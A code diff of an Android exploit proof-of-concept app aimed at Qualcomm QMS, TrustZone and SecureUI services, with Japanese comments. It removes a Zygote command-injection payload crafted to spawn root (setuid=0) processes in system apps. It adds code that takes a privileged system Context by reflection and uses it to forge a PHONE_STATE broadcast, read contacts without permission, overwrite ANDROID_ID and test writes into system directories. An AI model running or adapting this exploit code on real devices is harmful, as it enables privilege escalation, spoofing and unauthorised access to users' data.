@@ -1,10 +1,14 @@
 package com.example.tzpoc;
 
+import android.Manifest;
 import android.content.ComponentName;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
@@ -15,6 +19,7 @@ import android.os.Parcel;
 import android.os.ParcelFileDescriptor;
 import android.os.RemoteException;
 import android.provider.Settings;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ScrollView;
@@ -22,16 +27,15 @@ import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
-
 import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
 import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
 import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;
-
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
+import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
@@ -42,23 +46,27 @@ import java.util.Locale;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class MainActivity extends AppCompatActivity {
+    private static final String TAG = "EvolvedPoC";
     private static final String TARGET_PKG_CS = "com.qualcomm.qti.qms.service.connectionsecurity";
     private static final String TARGET_CLS_CS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";
     private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
     private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
+    private static final String TEST_DATA = "POC_WRITE_TEST_DATA_12345";
+    private static final String TEST_FILENAME = "poc_write_test.tmp";
 
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
     private Handler handler = new Handler(Looper.getMainLooper());
     private StringBuilder logBuilder = new StringBuilder();
-    private IServiceManager mServiceManager;
-    private IBinder mTZServiceBinder;
-    private boolean isBoundCS = false;
-    private boolean isBoundTZ = false;
     private AtomicBoolean isTesting = new AtomicBoolean(false);
     private AtomicBoolean stopRequested = new AtomicBoolean(false);
     private Thread testThread;
 
+    // サービスバインド用
+    private IServiceManager mServiceManager;
+    private IBinder mTZServiceBinder;
+    private boolean isBoundCS = false;
+    private boolean isBoundTZ = false;
     private ServiceConnection csConnection = new ServiceConnection() {
         @Override
         public void onServiceConnected(ComponentName name, IBinder service) {
@@ -74,7 +82,6 @@ public class MainActivity extends AppCompatActivity {
             updateStatus("CS disconnected");
         }
     };
-
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
         public void onServiceConnected(ComponentName name, IBinder service) {
@@ -90,6 +97,9 @@ public class MainActivity extends AppCompatActivity {
             updateStatus("TZ disconnected");
         }
     };
+
+    // SecureUI から取得したシステムコンテキスト
+    private Context systemContext;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -107,6 +117,9 @@ public class MainActivity extends AppCompatActivity {
                 isTesting.set(true);
                 enableButtons(false, true);
                 stopRequested.set(false);
+                // SecureUI のシステムコンテキストを取得
+                acquireSystemContext();
+                // CS/TZ サービスにバインド（失敗しても続行）
                 bindServices();
             }
         });
@@ -127,9 +140,9 @@ public class MainActivity extends AppCompatActivity {
 
     private void requestPermissions() {
         String[] perms = {
-                android.Manifest.permission.READ_EXTERNAL_STORAGE,
-                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                android.Manifest.permission.ACCESS_FINE_LOCATION
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.ACCESS_FINE_LOCATION
         };
         List<String> toRequest = new ArrayList<>();
         for (String p : perms) {
@@ -139,6 +152,23 @@ public class MainActivity extends AppCompatActivity {
         }
         if (!toRequest.isEmpty()) {
             ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
+        }
+    }
+
+    private void acquireSystemContext() {
+        try {
+            Class<?> clazz = Class.forName("com.qualcomm.qti.services.secureui.SecureUIService");
+            Field contextField = clazz.getDeclaredField("context");
+            contextField.setAccessible(true);
+            systemContext = (Context) contextField.get(null);
+            if (systemContext != null) {
+                appendLog("SystemContext acquired via reflection");
+            } else {
+                appendLog("SystemContext is null");
+            }
+        } catch (Exception e) {
+            appendLog("Failed to acquire SystemContext: " + e.getMessage());
+            systemContext = null;
         }
     }
 
@@ -155,14 +185,14 @@ public class MainActivity extends AppCompatActivity {
             if (!isBoundTZ) appendLog("TZ bind failed");
 
             if (!isBoundCS && !isBoundTZ) {
-                appendLog("Failed to bind any service");
-                enableButtons(true, false);
-                isTesting.set(false);
+                appendLog("Service bind failed, but continuing with SecureUI tests");
             }
         } catch (Exception e) {
             appendLog("Bind exception: " + e.toString());
-            enableButtons(true, false);
-            isTesting.set(false);
+        }
+        // すぐにテスト開始（サービスが後からバインドされたら startTests が再呼び出しされる）
+        if (!isBoundCS && !isBoundTZ) {
+            startTests();
         }
     }
 
@@ -180,6 +210,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void executeFullTest() {
+        // Phase 1: CS Service Enumeration
         appendLog("========== PHASE 1: CS Service Enumeration ==========");
         if (mServiceManager != null) {
             IBinder rticBinder = getService("rtic");
@@ -197,20 +228,40 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        appendLog("========== PHASE 2: Zygote Injection ==========");
-        testZygoteInjection();
-
-        appendLog("========== PHASE 3: TZAccess Socket Connect (Reflection) ==========");
+        // Phase 2: TZAccess Socket Connect (Reflection)
+        appendLog("========== PHASE 2: TZAccess Socket Connect ==========");
         if (mTZServiceBinder != null) {
             tryConnectViaTZReflect("/dev/socket/minksocket");
             tryConnectViaTZReflect("/dev/socket/ssgqmig");
         }
 
-        appendLog("========== PHASE 4: Deep File System Exploration ==========");
+        // Phase 3: Deep File System Exploration (original)
+        appendLog("========== PHASE 3: Deep File System Exploration ==========");
         exploreDeepFiles();
 
-        appendLog("========== PHASE 5: Settings Manipulation ==========");
+        // Phase 4: Settings Manipulation (normal)
+        appendLog("========== PHASE 4: Settings Manipulation ==========");
         testSettingsWrite();
+
+        // Phase 5: SecureUI SystemContext を活用した高度な検証
+        appendLog("========== PHASE 5: SecureUI SystemContext Advanced Tests ==========");
+        if (systemContext != null) {
+            testSystemContextBroadcast();
+            testSystemContextStartActivity();
+            testSystemContextContentProvider();
+            testSystemContextWriteSecureSettings();
+            testSystemContextFileWrite();
+        } else {
+            appendLog("SystemContext not available, skipping SecureUI advanced tests");
+        }
+
+        // Phase 6: 書き込み検証（従来のファイル書き込みテスト、systemContextを使ったものと重複するが残す）
+        appendLog("========== PHASE 6: Write Verification via SystemContext ==========");
+        if (systemContext != null) {
+            performWriteVerification();
+        } else {
+            appendLog("SystemContext not available, skipping write verification");
+        }
 
         appendLog("========== ALL TESTS COMPLETED ==========");
         updateStatus("Done");
@@ -218,6 +269,8 @@ public class MainActivity extends AppCompatActivity {
         enableButtons(true, false);
         saveLog();
     }
+
+    // ---------- 以下、各テストメソッド ----------
 
     private IBinder getService(String serviceName) {
         if (mServiceManager == null) return null;
@@ -333,48 +386,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void testZygoteInjection() {
-        appendLog("--- Zygote injection via hidden_api_blacklist_exemptions ---");
-        String[] targets = {
-            "com.android.shell",
-            "com.android.systemui",
-            "com.android.settings",
-            "com.android.chrome",
-            "com.android.vending",
-            "com.google.android.gms"
-        };
-        for (String pkg : targets) {
-            if (stopRequested.get()) break;
-            appendLog("Trying package: " + pkg);
-            try {
-                String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
-                StringBuilder payload = new StringBuilder();
-                for (int i = 0; i < 8000; i++) payload.append('A');
-                payload.append("9\n");
-                payload.append("--runtime-args\n");
-                payload.append("--setuid=0\n");
-                payload.append("--setgid=0\n");
-                payload.append("--target-sdk-version=29\n");
-                payload.append("--nice-name=root_" + pkg.replace(".", "_") + "\n");
-                payload.append("--app-data-dir=/data/data/" + pkg + "\n");
-                payload.append("--package-name=" + pkg + "\n");
-                payload.append("android.app.ActivityThread\n");
-                payload.append(",,,X");
-
-                String malicious = payload.toString();
-                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", malicious);
-                String oldPolicy = Settings.Global.getString(getContentResolver(), "hidden_api_policy");
-                Settings.Global.putString(getContentResolver(), "hidden_api_policy", "1");
-                Settings.Global.putString(getContentResolver(), "hidden_api_policy", oldPolicy != null ? oldPolicy : "");
-                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
-                appendLog("  Injected for " + pkg + " (restored)");
-                Thread.sleep(500);
-            } catch (Exception e) {
-                appendLog("  Error for " + pkg + ": " + e.getMessage());
-            }
-        }
-    }
-
     private void tryConnectViaTZReflect(String path) {
         appendLog("Trying TZAccess connect to " + path + " via reflection");
         if (mTZServiceBinder == null) {
@@ -404,27 +415,27 @@ public class MainActivity extends AppCompatActivity {
     private void exploreDeepFiles() {
         appendLog("--- Deep File System Exploration ---");
         String[] additionalProc = {
-            "/proc/self/fd",
-            "/proc/self/cwd",
-            "/proc/self/root",
-            "/proc/self/maps",
-            "/proc/self/smaps",
-            "/proc/self/oom_adj",
-            "/proc/self/oom_score",
-            "/proc/self/comm",
-            "/proc/self/auxv",
-            "/proc/self/limits",
-            "/proc/self/sched",
-            "/proc/self/stack",
-            "/proc/self/statm",
-            "/proc/self/wchan",
-            "/proc/self/pagemap",
-            "/proc/self/clear_refs",
-            "/proc/self/timers",
-            "/proc/self/attr/current",
-            "/proc/self/loginuid",
-            "/proc/self/sessionid",
-            "/proc/self/cgroup"
+                "/proc/self/fd",
+                "/proc/self/cwd",
+                "/proc/self/root",
+                "/proc/self/maps",
+                "/proc/self/smaps",
+                "/proc/self/oom_adj",
+                "/proc/self/oom_score",
+                "/proc/self/comm",
+                "/proc/self/auxv",
+                "/proc/self/limits",
+                "/proc/self/sched",
+                "/proc/self/stack",
+                "/proc/self/statm",
+                "/proc/self/wchan",
+                "/proc/self/pagemap",
+                "/proc/self/clear_refs",
+                "/proc/self/timers",
+                "/proc/self/attr/current",
+                "/proc/self/loginuid",
+                "/proc/self/sessionid",
+                "/proc/self/cgroup"
         };
         for (String p : additionalProc) {
             if (stopRequested.get()) break;
@@ -432,11 +443,11 @@ public class MainActivity extends AppCompatActivity {
         }
 
         String[] sysFiles = {
-            "/system/build.prop",
-            "/system/etc/hosts",
-            "/system/etc/security/cacerts/",
-            "/vendor/build.prop",
-            "/proc/version"
+                "/system/build.prop",
+                "/system/etc/hosts",
+                "/system/etc/security/cacerts/",
+                "/vendor/build.prop",
+                "/proc/version"
         };
         for (String p : sysFiles) {
             if (stopRequested.get()) break;
@@ -503,7 +514,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void testSettingsWrite() {
-        appendLog("--- Settings Write ---");
+        appendLog("--- Normal Settings Write (without system context) ---");
         try {
             String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
             appendLog("Current hidden_api_blacklist_exemptions: " + current);
@@ -518,6 +529,183 @@ public class MainActivity extends AppCompatActivity {
             appendLog("Settings error: " + e.getMessage());
         }
     }
+
+    // ========== SecureUI SystemContext を利用した高度なテスト ==========
+
+    private void testSystemContextBroadcast() {
+        appendLog("--- Sending broadcast with SystemContext ---");
+        try {
+            Intent intent = new Intent("com.qualcomm.qti.services.secureui.ACTION_CLOSE");
+            intent.setPackage("com.qualcomm.qti.services.secureui");
+            systemContext.sendBroadcast(intent);
+            appendLog("Broadcast ACTION_CLOSE sent (may trigger OrientationActivity close)");
+        } catch (Exception e) {
+            appendLog("Broadcast send failed: " + e.getMessage());
+        }
+
+        // 電話状態偽装（保護されているため通常はSecurityException）
+        try {
+            Intent phoneIntent = new Intent("android.intent.action.PHONE_STATE");
+            phoneIntent.putExtra("state", "RINGING");
+            systemContext.sendBroadcast(phoneIntent);
+            appendLog("Fake PHONE_STATE broadcast sent");
+        } catch (Exception e) {
+            appendLog("PHONE_STATE broadcast failed: " + e.getMessage());
+        }
+    }
+
+    private void testSystemContextStartActivity() {
+        appendLog("--- Starting activity with SystemContext ---");
+        try {
+            // システム設定アプリを起動（権限昇格の可否）
+            Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
+            settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            systemContext.startActivity(settingsIntent);
+            appendLog("Settings activity started using SystemContext");
+        } catch (Exception e) {
+            appendLog("StartActivity failed: " + e.getMessage());
+        }
+    }
+
+    private void testSystemContextContentProvider() {
+        appendLog("--- Querying ContentProvider with SystemContext ---");
+        ContentResolver cr = systemContext.getContentResolver();
+        // 問い合わせ：設定データベース
+        try (Cursor c = cr.query(Settings.Global.CONTENT_URI, null, null, null, null)) {
+            if (c != null) {
+                appendLog("Settings.Global query succeeded, count=" + c.getCount());
+                c.close();
+            } else {
+                appendLog("Settings.Global query returned null");
+            }
+        } catch (Exception e) {
+            appendLog("Settings.Global query error: " + e.getMessage());
+        }
+
+        // 連絡先（READ_CONTACTS 権限がなくてもシステム権限なら可能？）
+        try (Cursor c = cr.query(Uri.parse("content://contacts/people"), null, null, null, null)) {
+            if (c != null) {
+                appendLog("Contacts query succeeded, count=" + c.getCount());
+                c.close();
+            } else {
+                appendLog("Contacts query returned null");
+            }
+        } catch (Exception e) {
+            appendLog("Contacts query error: " + e.getMessage());
+        }
+    }
+
+    private void testSystemContextWriteSecureSettings() {
+        appendLog("--- Writing Secure Settings with SystemContext ---");
+        try {
+            // WRITE_SECURE_SETTINGS は通常アプリでは不可だが、SystemContext経由で可能か確認
+            boolean result = Settings.Secure.putString(systemContext.getContentResolver(),
+                    Settings.Secure.ANDROID_ID, "POC_TEST_ID");
+            appendLog("Write to Secure.ANDROID_ID result: " + result);
+            // 元に戻す（失敗するかも）
+            Settings.Secure.putString(systemContext.getContentResolver(),
+                    Settings.Secure.ANDROID_ID, Build.SERIAL); // 仮
+        } catch (Exception e) {
+            appendLog("Write Secure Settings error: " + e.getMessage());
+        }
+    }
+
+    private void testSystemContextFileWrite() {
+        appendLog("--- File write test using SystemContext (indirect) ---");
+        // SystemContext 自体はファイル書き込みに直接使えないが、getContentResolver().openOutputStream() 等を試す
+        try {
+            ContentResolver cr = systemContext.getContentResolver();
+            // 外部ストレージへの書き込み（Downloadディレクトリ）
+            File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+            File testFile = new File(download, "systemcontext_write_test.txt");
+            Uri fileUri = Uri.fromFile(testFile);
+            try (java.io.OutputStream os = cr.openOutputStream(fileUri)) {
+                if (os != null) {
+                    os.write("Written via SystemContext".getBytes(StandardCharsets.UTF_8));
+                    appendLog("File write via SystemContext succeeded: " + testFile.getAbsolutePath());
+                } else {
+                    appendLog("openOutputStream returned null");
+                }
+            } catch (Exception e) {
+                appendLog("File write via SystemContext failed: " + e.getMessage());
+            }
+        } catch (Exception e) {
+            appendLog("SystemContext file write setup error: " + e.getMessage());
+        }
+    }
+
+    // ========== 書き込み検証（元のPoC） ==========
+
+    private void performWriteVerification() {
+        appendLog("--- Write Verification (FileOutputStream direct) ---");
+        String[] targetDirs = {
+                "/data/local/tmp",
+                "/data/misc",
+                "/data/system",
+                "/data/data",
+                "/cache",
+                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
+                "/dev",
+                "/proc",
+                "/sys",
+                "/system",
+                "/"
+        };
+        for (String dirPath : targetDirs) {
+            if (stopRequested.get()) break;
+            File dir = new File(dirPath);
+            if (!dir.exists()) {
+                appendLog("Directory " + dirPath + " does not exist, skipping");
+                continue;
+            }
+            File testFile = new File(dir, TEST_FILENAME);
+            boolean writeOk = writeFile(testFile, TEST_DATA);
+            boolean verifyOk = false;
+            boolean deleteOk = false;
+            if (writeOk) {
+                verifyOk = verifyFile(testFile, TEST_DATA);
+                if (verifyOk) {
+                    deleteOk = testFile.delete();
+                }
+            }
+            appendLog(String.format(Locale.US,
+                    "Dir: %s | canWrite=%b | write=%b | verify=%b | delete=%b",
+                    dirPath, dir.canWrite(), writeOk, verifyOk, deleteOk));
+        }
+    }
+
+    private boolean writeFile(File file, String data) {
+        try {
+            File parent = file.getParentFile();
+            if (parent != null && !parent.exists()) {
+                parent.mkdirs();
+            }
+            try (FileOutputStream fos = new FileOutputStream(file)) {
+                fos.write(data.getBytes(StandardCharsets.UTF_8));
+                fos.flush();
+                return true;
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "Write failed for " + file.getAbsolutePath() + ": " + e.getMessage());
+            return false;
+        }
+    }
+
+    private boolean verifyFile(File file, String expected) {
+        if (!file.exists()) return false;
+        try (FileInputStream fis = new FileInputStream(file)) {
+            byte[] buffer = new byte[expected.length() + 10];
+            int len = fis.read(buffer);
+            if (len <= 0) return false;
+            String actual = new String(buffer, 0, len, StandardCharsets.UTF_8);
+            return expected.equals(actual);
+        } catch (Exception e) {
+            Log.w(TAG, "Verify failed for " + file.getAbsolutePath() + ": " + e.getMessage());
+            return false;
+        }
+    }
+
+    // ========== ログとUI ==========
 
     private void appendLog(final String msg) {
         String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
